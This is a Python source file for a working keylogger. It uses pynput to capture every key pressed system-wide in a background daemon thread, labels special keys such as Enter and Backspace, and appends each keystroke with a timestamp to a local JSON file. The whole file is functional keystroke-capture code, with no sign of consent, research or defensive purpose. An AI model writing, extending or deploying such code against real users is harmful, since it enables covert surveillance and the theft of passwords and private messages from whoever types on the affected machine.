from pynput.keyboard import Listener
from datetime import datetime
import threading
from data_storage import DataStorage

class KeyboardLogger:
    def __init__(self, output_path="keylogs.json"):
        self.output_path = output_path
        self.data_storage = DataStorage(output_path)  # Using DataStorage with a separate file

    def on_press(self, key):
        try:
            key_name = key.char
        except AttributeError:
            key_name = str(key)

        if key_name == "Key.space":
            key_name = " "
        elif key_name == "Key.enter":
            key_name = "[ENTER]"
        elif key_name == "Key.backspace":
            key_name = "[BACKSPACE]"
        elif "Key." in key_name:
            key_name = f"[{key_name.replace('Key.', '').upper()}]"

        # Prepare the data to be saved
        key_event = {
            "key": key_name,
            "timestamp": str(datetime.now())
        }

        # Save the data using DataStorage
        self.data_storage.append_keystroke(key_event)

    def start_listener(self):
        """Start listening for keyboard input."""
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def run_listener(self):
        """Start keylogger listener in a separate thread."""
        t = threading.Thread(target=self.start_listener)
        t.daemon = True
        t.start()

if __name__ == "__main__":
    logger = KeyboardLogger(output_path="keylogs.json")
    logger.run_listener()

    while True:
        pass  # Keeps the program running for testing purposes
